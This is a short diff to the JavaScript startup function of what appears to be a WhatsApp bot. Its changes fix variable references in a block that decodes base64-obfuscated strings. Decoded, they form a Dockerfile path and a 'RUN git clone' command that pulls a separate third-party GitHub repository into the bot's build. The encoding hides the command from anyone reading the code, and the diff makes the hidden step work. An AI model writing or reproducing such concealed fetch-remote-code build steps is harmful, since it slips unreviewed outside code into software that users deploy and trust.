@@ -79,13 +79,13 @@ async function whatsAsena () {
     var clf = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vYWJkdWxsYWg1MTUxL1doYXRzQXBvRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA==', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
     var sss = Buffer.from(clf.cd, 'base64')
     var exc_sl = Buffer.from(clf.exc, 'base64')
-    var sss = bbb.toString('utf-8')
+    var bbb = sss.toString('utf-8')
     var ptc_one = Buffer.from(clf.pth_w, 'base64')
     var ptc_nw = ptc_one.toString('utf-8')
     clf.pth_v = ptc_nw
     var exc_fn = exc_sl.toString('utf-8')
     clf.exc_pl = exc_fn
-    clf.pay = fff
+    clf.pay = bbb
     const conn = new WAConnection();
     const Session = new StringSession();
     conn.version = [3, 3234, 9]
